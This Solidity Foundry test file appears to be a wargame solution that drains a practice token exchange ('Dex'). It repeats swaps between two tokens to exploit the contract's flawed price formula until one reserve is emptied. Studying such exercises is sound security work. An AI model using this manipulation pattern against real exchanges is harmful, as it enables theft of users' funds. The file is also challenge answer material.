// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Dex.sol";

contract test_solution is Test {
    SwappableToken token1;
    SwappableToken token2;
    Dex dex;
    address player = makeAddr("player");

    function setUp() public {
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "token1", "t1", 500);
        token2 = new SwappableToken(address(dex), "token2", "t2", 500);

        dex.setTokens(address(token1), address(token2));
        token1.transfer(address(dex), 100);
        token2.transfer(address(dex), 100);
        token1.transfer(player, 10);
        token2.transfer(player, 10);
    }

    function test_dex() public {
        vm.startPrank(player);
        dex.approve(address(dex), type(uint256).max);
        token1.transfer(address(dex), 10);
        console.log("swap amount", dex.getSwapPrice(address(token2), address(token1), 10));
        dex.swap(address(token2), address(token1), 10);
        dex.swap(address(token1), address(token2), 11);
        console.log("current balance", token2.balanceOf(player));
        dex.swap(address(token2), address(token1), token2.balanceOf(player));
        dex.swap(address(token1), address(token2), token1.balanceOf(player));
        dex.swap(address(token2), address(token1), token2.balanceOf(player));
        dex.swap(address(token1), address(token2), token1.balanceOf(player));
        dex.swap(address(token2), address(token1), token2.balanceOf(player));
        dex.swap(address(token1), address(token2), token1.balanceOf(player));
        dex.swap(address(token2), address(token1), token2.balanceOf(player));
        dex.swap(address(token1), address(token2), token1.balanceOf(player));

        dex.swap(address(token2), address(token1), token2.balanceOf(player));
        dex.swap(address(token1), address(token2), 34);

        console.log("current balance token1/player", token1.balanceOf(player));
        console.log("current balance token2/player", token2.balanceOf(player));
        console.log("current balance token1/dex", token1.balanceOf(address(dex)));
        console.log("current balance token2/dex", token2.balanceOf(address(dex)));
    }
}
